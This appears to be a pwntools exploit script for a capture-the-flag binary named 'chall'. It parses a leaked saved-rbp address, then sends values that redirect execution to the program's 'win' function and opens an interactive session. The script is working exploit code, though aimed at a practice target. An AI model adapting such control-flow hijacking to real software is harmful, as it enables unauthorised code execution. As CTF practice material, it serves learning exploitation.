from pwn import *

elf = ELF('./chall')
io = process(elf.path)

io.recvuntil(b'saved rbp')
io.recvuntil(b'0x')
addr = int(io.recv(16).strip(), 16)
log.info(f'addr: {hex(addr)}')

io.sendlineafter(b'> ', str(addr).encode())
io.sendlineafter(b'= ', str(elf.sym['win']).encode())

io.interactive()

